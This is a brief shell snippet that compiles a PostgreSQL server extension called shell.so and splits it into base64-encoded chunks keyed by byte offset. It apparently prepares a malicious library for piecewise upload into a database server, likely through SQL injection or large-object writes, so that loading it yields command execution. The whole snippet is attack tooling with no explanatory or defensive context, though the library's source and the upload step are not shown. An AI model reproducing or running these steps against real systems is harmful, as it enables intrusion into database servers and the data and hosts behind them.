 gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o shell.so shell.c
 FILE="./shell.so"
 OUTPUT_DIR="./shell_chunks"
 CHUNK_SIZE=2048
    
 mkdir "$OUTPUT_DIR"
 split -b $CHUNK_SIZE "$FILE" "$OUTPUT_DIR/"
 OFFSET=0; for f in $OUTPUT_DIR/*; do  base64 -w 0 < $f > "$OUTPUT_DIR/base64_$OFFSET"; rm $f; OFFSET=$(($OFFSET+$CHUNK_SIZE)); done